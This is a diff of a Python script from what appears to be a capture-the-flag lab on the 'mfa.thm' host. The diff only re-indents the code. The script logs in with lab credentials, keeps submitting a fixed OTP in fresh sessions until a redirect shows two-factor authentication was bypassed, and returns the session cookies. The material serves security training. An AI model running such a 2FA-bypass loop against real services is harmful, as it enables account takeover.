@@ -132,9 +132,9 @@ dashboard\_url = 'http://mfa.thm/labs/third/dashboard'
 
 credentials = {
 
-`    `'email': 'thm@mail.thm',
+    'email': 'thm@mail.thm',
 
-`    `'password': 'test123'
+    'password': 'test123'
 
 }
 
@@ -142,23 +142,23 @@ credentials = {
 
 headers = {
 
-`    `'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
 
-`    `'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8',
 
-`    `'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Language': 'en-US,en;q=0.5',
 
-`    `'Accept-Encoding': 'gzip, deflate',
+    'Accept-Encoding': 'gzip, deflate',
 
-`    `'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Type': 'application/x-www-form-urlencoded',
 
-`    `'Origin': 'http://mfa.thm',
+    'Origin': 'http://mfa.thm',
 
-`    `'Connection': 'close',
+    'Connection': 'close',
 
-`    `'Referer': 'http://mfa.thm/labs/third/mfa',
+    'Referer': 'http://mfa.thm/labs/third/mfa',
 
-`    `'Upgrade-Insecure-Requests': '1'
+    'Upgrade-Insecure-Requests': '1'
 
 }
 
@@ -166,15 +166,15 @@ headers = {
 
 def is\_login\_successful(response):
 
-`    `return "User Verification" in response.text and response.status\_code == 200
+    return "User Verification" in response.text and response.status\_code == 200
 
 \# Function to handle the login process
 
 def login(session):
 
-`    `response = session.post(login\_url, data=credentials, headers=headers)
+    response = session.post(login\_url, data=credentials, headers=headers)
 
-`    `return response
+    return response
 
 
 
@@ -182,99 +182,99 @@ def login(session):
 
 def submit\_otp(session, otp):
 
-`    `# Split the OTP into individual digits
+    # Split the OTP into individual digits
 
-`    `otp\_data = {
+    otp\_data = {
 
-`        `'code-1': otp[0],
+        'code-1': otp[0],
 
-`        `'code-2': otp[1],
+        'code-2': otp[1],
 
-`        `'code-3': otp[2],
+        'code-3': otp[2],
 
-`        `'code-4': otp[3]
+        'code-4': otp[3]
 
-`    `}
-
-
-
-`    `response = session.post(otp\_url, data=otp\_data, headers=headers, allow\_redirects=False)  # Disable auto redirects
-
-`    `print(f"DEBUG: OTP submission response status code: {response.status\_code}")
+    }
 
 
 
-`    `return response
+    response = session.post(otp\_url, data=otp\_data, headers=headers, allow\_redirects=False)  # Disable auto redirects
+
+    print(f"DEBUG: OTP submission response status code: {response.status\_code}")
+
+
+
+    return response
 
 \# Function to check if the response contains the login page
 
 def is\_login\_page(response):
 
-`    `return "Sign in to your account" in response.text or "Login" in response.text
+    return "Sign in to your account" in response.text or "Login" in response.text
 
 \# Function to attempt login and submit the hardcoded OTP until success
 
 def try\_until\_success():
 
-`    `otp\_str = '1337'  # Hardcoded OTP
+    otp\_str = '1337'  # Hardcoded OTP
 
-`    `while True:  # Keep trying until success
+    while True:  # Keep trying until success
 
-`        `session = requests.Session()  # Create a new session object for each attempt
+        session = requests.Session()  # Create a new session object for each attempt
 
-`        `login\_response = login(session)  # Log in before each OTP attempt
+        login\_response = login(session)  # Log in before each OTP attempt
 
 
 
-`        `if is\_login\_successful(login\_response):
+        if is\_login\_successful(login\_response):
 
-`            `print("Logged in successfully.")
+            print("Logged in successfully.")
 
-`        `else:
+        else:
 
-`            `print("Failed to log in.")
+            print("Failed to log in.")
 
-`            `continue
+            continue
 
-`        `print(f"Trying OTP: {otp\_str}")
+        print(f"Trying OTP: {otp\_str}")
 
-`        `response = submit\_otp(session, otp\_str)
+        response = submit\_otp(session, otp\_str)
 
-`        `# Check if the response is the login page (unsuccessful OTP)
+        # Check if the response is the login page (unsuccessful OTP)
 
-`        `if is\_login\_page(response):
+        if is\_login\_page(response):
 
-`            `print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp\_str}")
+            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp\_str}")
 
-`            `continue  # Retry login and OTP submission
+            continue  # Retry login and OTP submission
 
-`        `# Check if the response is a redirect (status code 302)
+        # Check if the response is a redirect (status code 302)
 
-`        `if response.status\_code == 302:
+        if response.status\_code == 302:
 
-`            `location\_header = response.headers.get('Location', '')
+            location\_header = response.headers.get('Location', '')
 
-`            `print(f"Session cookies: {session.cookies.get\_dict()}")
+            print(f"Session cookies: {session.cookies.get\_dict()}")
 
-`            `# Check if it successfully bypassed 2FA and landed on the dashboard
+            # Check if it successfully bypassed 2FA and landed on the dashboard
 
-`            `if location\_header == '/labs/third/dashboard':
+            if location\_header == '/labs/third/dashboard':
 
-`                `print(f"Successfully bypassed 2FA with OTP: {otp\_str}")
+                print(f"Successfully bypassed 2FA with OTP: {otp\_str}")
 
-`                `return session.cookies.get\_dict()  # Return session cookies after successful bypass
+                return session.cookies.get\_dict()  # Return session cookies after successful bypass
 
-`            `elif location\_header == '/labs/third/':
+            elif location\_header == '/labs/third/':
 
-`                `print(f"Failed OTP attempt. Redirected to login. OTP: {otp\_str}")
+                print(f"Failed OTP attempt. Redirected to login. OTP: {otp\_str}")
 
-`            `else:
+            else:
 
-`                `print(f"Unexpected redirect location: {location\_header}. OTP: {otp\_str}")
+                print(f"Unexpected redirect location: {location\_header}. OTP: {otp\_str}")
 
-`        `else:
+        else:
 
-`            `print(f"Received status code {response.status\_code}. Retrying...")
+            print(f"Received status code {response.status\_code}. Retrying...")
 
 \# Start the attack to try until success
 
